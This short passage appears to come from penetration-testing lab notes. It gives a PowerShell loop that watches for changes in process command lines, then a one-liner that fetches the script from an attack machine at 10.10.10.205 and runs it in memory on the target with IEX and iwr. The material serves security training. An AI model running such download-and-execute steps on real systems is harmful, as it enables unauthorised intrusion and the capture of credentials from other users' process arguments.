
It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```PowerShell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

Hosting the script on our attack machine and execute it on the target host.

```PowerShell
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

---